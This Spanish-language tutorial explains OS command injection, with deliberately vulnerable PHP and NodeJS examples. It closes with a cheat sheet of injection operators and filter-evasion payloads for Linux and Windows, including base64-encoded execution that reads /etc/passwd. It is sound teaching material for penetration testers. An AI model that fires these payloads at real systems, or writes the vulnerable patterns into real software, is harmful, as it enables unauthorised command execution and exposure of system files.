
# Command Injection

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Introducción a Command Injection</mark>

***

Una vulnerabilidad de inyección de comandos es uno de los tipos de vulnerabilidades más críticos. Nos permite ejecutar comandos del sistema directamente en el servidor de alojamiento back-end, lo que podría poner en riesgo toda la red. Si una aplicación web utiliza una entrada controlada por el usuario para ejecutar un comando del sistema en el servidor back-end para recuperar y devolver un resultado específico, es posible que podamos inyectar una carga maliciosa para subvertir el comando previsto y ejecutar nuestros comandos.

***

### ¿Qué son las inyecciones?

Las vulnerabilidades de inyección se consideran el riesgo número 3 en [la lista de los 10 principales riesgos de las aplicaciones web de OWASP](https://owasp.org/www-project-top-ten/) , dado su alto impacto y lo comunes que son. La inyección ocurre cuando la entrada controlada por el usuario se malinterpreta como parte de la consulta web o el código que se está ejecutando, lo que puede llevar a subvertir el resultado previsto de la consulta a un resultado diferente que sea útil para el atacante.

Existen muchos tipos de inyecciones en las aplicaciones web, según el tipo de consulta web que se esté ejecutando. A continuación, se muestran algunos de los tipos de inyecciones más comunes:

<table data-header-hidden><thead><tr><th width="245"></th><th></th></tr></thead><tbody><tr><td>Inyección</td><td>Descripción</td></tr><tr><td>Inyección de comandos del sistema operativo</td><td>Se produce cuando la entrada del usuario se utiliza directamente como parte de un comando del sistema operativo.</td></tr><tr><td>Inyección de código</td><td>Se produce cuando la entrada del usuario se realiza directamente dentro de una función que evalúa el código.</td></tr><tr><td>Inyecciones SQL</td><td>Se produce cuando la entrada del usuario se utiliza directamente como parte de una consulta SQL.</td></tr><tr><td>Inyección de HTML/Scripts entre sitios</td><td>Se produce cuando se muestra la entrada exacta del usuario en una página web.</td></tr></tbody></table>

Existen muchos otros tipos de inyecciones además de las mencionadas anteriormente, como `LDAP injection`, `NoSQL Injection`, `HTTP Header Injection`, `XPath Injection`, `IMAP Injection`, `ORM Injection`, y otras. Siempre que se utilice la entrada del usuario dentro de una consulta sin que se haya depurado adecuadamente, es posible escapar de los límites de la cadena de entrada del usuario a la consulta principal y manipularla para cambiar su propósito previsto. Por eso, a medida que se introduzcan más tecnologías web en las aplicaciones web, veremos nuevos tipos de inyecciones introducidas en las aplicaciones web.

***

## <mark style="color:purple;">Inyecciones de comandos del sistema operativo</mark>

Cuando se trata de inyecciones de comandos del sistema operativo, la entrada del usuario que controlamos debe ingresar directa o indirectamente (o afectar de alguna manera) a una consulta web que ejecuta comandos del sistema. Todos los lenguajes de programación web tienen diferentes funciones que permiten al desarrollador ejecutar comandos del sistema operativo directamente en el servidor back-end cuando lo necesite. Esto se puede utilizar para diversos fines, como instalar complementos o ejecutar ciertas aplicaciones.

### **Ejemplo PHP**

Por ejemplo, una aplicación web escrita en `PHP` puede usar las funciones `exec`, `system`, `shell_exec`, `passthru`o `popen`p para ejecutar comandos directamente en el servidor back-end, cada una de las cuales tiene un caso de uso ligeramente diferente. El siguiente código es un ejemplo de código PHP que es vulnerable a inyecciones de comandos:

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

Quizás una aplicación web en particular tenga una funcionalidad que permita a los usuarios crear un nuevo documento `.pdf` que se crea en el directorio `/tmp` con un nombre de archivo proporcionado por el usuario y que luego puede ser utilizado por la aplicación web para fines de procesamiento de documentos. Sin embargo, como la entrada del usuario del parámetro `filename` en la solicitud `GET` se utiliza directamente con el comando `touch` (sin ser depurada o escapada primero), la aplicación web se vuelve vulnerable a la inyección de comandos del sistema operativo. Esta falla se puede explotar para ejecutar comandos arbitrarios del sistema en el servidor back-end.

### **Ejemplo de NodeJS**

Esto no es exclusivo de `PHP` , sino que puede ocurrir en cualquier marco o lenguaje de desarrollo web. Por ejemplo, si se desarrolla una aplicación web en `NodeJS`, un desarrollador puede usar `child_process.exec` o `child_process.spawn` para el mismo propósito. El siguiente ejemplo realiza una función similar a la que analizamos anteriormente:

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

El código anterior también es vulnerable a una vulnerabilidad de inyección de comandos, ya que utiliza el parámetro `filename` de la solicitud `GET` como parte del comando sin sanearlo primero. Tanto las aplicaciones web `PHP` como `NodeJS` pueden ser explotadas utilizando los mismos métodos de inyección de comandos.

Del mismo modo, otros lenguajes de programación de desarrollo web tienen funciones similares que se utilizan para los mismos fines y, si son vulnerables, se pueden explotar utilizando los mismos métodos de inyección de comandos. Además, las vulnerabilidades de inyección de comandos no son exclusivas de las aplicaciones web, sino que también pueden afectar a otros archivos binarios y clientes pesados ​​si pasan una entrada de usuario no saneada a una función que ejecuta comandos del sistema, que también se pueden explotar con los mismos métodos de inyección de comandos.

En la siguiente sección se analizarán diferentes métodos para detectar y explotar vulnerabilidades de inyección de comandos en aplicaciones web.

***

## <mark style="color:purple;">Cheatsheet</mark>

### Operadores de inyección

| **Operador de inyección** | **Carácter de inyección** | **Carácter codificado en URL** | **Comando ejecutado**                                     |
| ------------------------- | ------------------------- | ------------------------------ | --------------------------------------------------------- |
| Punto y coma              | `;`                       | `%3b`                          | Ambos                                                     |
| Nueva linea               |                           | `%0a`                          | Ambos                                                     |
| Background                | `&`                       | `%26`                          | Ambos (la segunda salida generalmente se muestra primero) |
| Pipe                      | `\|`                      | `%7c`                          | Ambos (solo se muestra la segunda salida)                 |
| AND                       | `&&`                      | `%26%26`                       | Ambos (solo si el primero tiene éxito)                    |
| OR                        | `\|\|`                    | `%7c%7c`                       | Segundo (solo si falla el primero)                        |
| Sub-Shell                 | ` `` `                    | `%60%60`                       | Ambos (solo Linux)                                        |
| Sub-Shell                 | `$()`                     | `%24%28%29`                    | Ambos (solo Linux)                                        |

## <mark style="color:purple;">Linux</mark>

### Omisión de caracteres filtrados

<table data-header-hidden><thead><tr><th width="258"></th><th></th></tr></thead><tbody><tr><td>Código</td><td>Descripción</td></tr><tr><td><code>printenv</code></td><td>Se puede utilizar para ver todas las variables del entorno.</td></tr><tr><td><strong>Espacios</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Usar tabulaciones en lugar de espacios</td></tr><tr><td><code>${IFS}</code></td><td>Se reemplazará por un espacio y una tabulación. No se puede utilizar en subcapas (es decir, <code>$()</code>)</td></tr><tr><td><code>{ls,-la}</code></td><td>Las comas serán reemplazadas por espacios.</td></tr><tr><td><strong>Otros caracteres</strong></td><td></td></tr><tr><td><code>${PATH:0:1}</code></td><td>Será reemplazado por <code>/</code></td></tr><tr><td><code>${LS_COLORS:10:1}</code></td><td>Será reemplazado por <code>;</code></td></tr><tr><td><code>$(tr '!-}' '"-~'&#x3C;&#x3C;&#x3C;[)</code></td><td>Desplazar carácter por uno ( <code>[</code>-> <code>\</code>)</td></tr></tbody></table>

### Comando de omisión en la lista negra

<table data-header-hidden><thead><tr><th width="372"></th><th></th></tr></thead><tbody><tr><td>Código</td><td>Descripción</td></tr><tr><td><strong>Inserción de caracteres</strong></td><td></td></tr><tr><td><code>'</code> o <code>"</code></td><td>El total debe ser par</td></tr><tr><td><code>$@</code> o <code>\</code></td><td>Solo Linux</td></tr><tr><td><strong>Manipulación de casos</strong></td><td></td></tr><tr><td><code>$(tr "[A-Z]" "[a-z]"&#x3C;&#x3C;&#x3C;"WhOaMi")</code></td><td>Ejecutar comando independientemente de mayúsculas y minúsculas</td></tr><tr><td><code>$(a="WhOaMi";printf %s "${a,,}")</code></td><td>Otra variación de la técnica</td></tr><tr><td><strong>Comandos invertidos</strong></td><td></td></tr><tr><td><code>echo 'whoami' | rev</code></td><td>Invertir una cadena</td></tr><tr><td><code>$(rev&#x3C;&#x3C;&#x3C;'imaohw')</code></td><td>Ejecutar comando inverso</td></tr><tr><td><strong>Comandos codificados</strong></td><td></td></tr><tr><td><code>echo -n 'cat /etc/passwd | grep 33' | base64</code></td><td>Codificar una cadena con base64</td></tr><tr><td><code>bash&#x3C;&#x3C;&#x3C;$(base64 -d&#x3C;&#x3C;&#x3C;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td><td>Ejecutar cadena codificada b64</td></tr></tbody></table>

## <mark style="color:purple;">Windows</mark>

### Omisión de caracteres filtrados

<table data-header-hidden><thead><tr><th width="260"></th><th></th></tr></thead><tbody><tr><td>Código</td><td>Descripción</td></tr><tr><td><code>Get-ChildItem Env:</code></td><td>Se puede utilizar para ver todas las variables de entorno (PowerShell)</td></tr><tr><td><strong>Espacios</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Usar tabulaciones en lugar de espacios</td></tr><tr><td><code>%PROGRAMFILES:~10,-5%</code></td><td>Será reemplazado por un espacio - (CMD)</td></tr><tr><td><code>$env:PROGRAMFILES[10]</code></td><td>Se reemplazará con un espacio - (PowerShell)</td></tr><tr><td><strong>Otros personajes</strong></td><td></td></tr><tr><td><code>%HOMEPATH:~0,-17%</code></td><td>Será reemplazado por <code>\</code>- (CMD)</td></tr><tr><td><code>$env:HOMEPATH[0]</code></td><td>Será reemplazado por <code>\</code>- (PowerShell)</td></tr></tbody></table>

### Comando de omisión en la lista negra

| Código                                                                                                       | Descripción                                                        |
| ------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------ |
| **Inserción de caracteres**                                                                                  |                                                                    |
| `'`o`"`                                                                                                      | El total debe ser par                                              |
| `^`                                                                                                          | Sólo Windows (CMD)                                                 |
| **Manipulación de casos**                                                                                    |                                                                    |
| `WhoAmi`                                                                                                     | Simplemente envíe el personaje con mayúsculas y minúsculas impares |
| **Comandos invertidos**                                                                                      |                                                                    |
| `"whoami"[-1..-20] -join ''`                                                                                 | Invertir una cadena                                                |
| `iex "$('imaohw'[-1..-20] -join '')"`                                                                        | Ejecutar comando inverso                                           |
| **Comandos codificados**                                                                                     |                                                                    |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Codificar una cadena con base64                                    |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Ejecutar cadena codificada b64                                     |
